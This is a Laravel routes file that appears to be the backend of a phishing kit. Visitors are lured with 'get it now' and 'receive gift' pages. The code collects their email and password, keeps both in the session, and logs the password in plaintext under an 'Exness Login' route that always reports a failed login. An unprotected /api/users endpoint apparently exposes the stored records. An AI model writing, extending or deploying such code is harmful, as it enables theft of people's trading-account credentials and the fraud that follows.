<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Models\User;

Route::middleware(['force.https'])->group(function () {
    Route::get('/', function () {
        return view('getItNow');
    });

    Route::get('/welcome', function () {
        return view('welcome');
    });

    Route::post('/receive', function () {
        $email = request('email');
        $password = request('password');

        $admin = User::where('email', $email)
            ->where('password', $password)
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            session(['email' => $email, 'password' => $password]);
            return redirect()->secure('/admin');
        }

        session(['email' => $email, 'password' => $password]);
        return redirect()->secure('/nhanQua');
    })->name('login.step1');

    Route::get('/nhanQua', function () {
        return view('receiveGift');
    });

    Route::post('/', [UserController::class, 'store'])->name('login.store');
    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');
    Route::get('/api/users', [UserController::class, 'getUsersJson']);
    Route::get('/exness-login', function () {
        $email = session('email');
        $password = session('password');
        \Log::info('Exness Login: Received session email=' . $email . ', password=' . $password);
        if (!$email || !$password) {
            return redirect()->secure('/welcome')->with('error', 'Thông tin không hợp lệ');
        }
        return redirect()->secure('/welcome')->with('error', 'Login failed, please try again'); // Fallback
    })->name('exness.login');
});
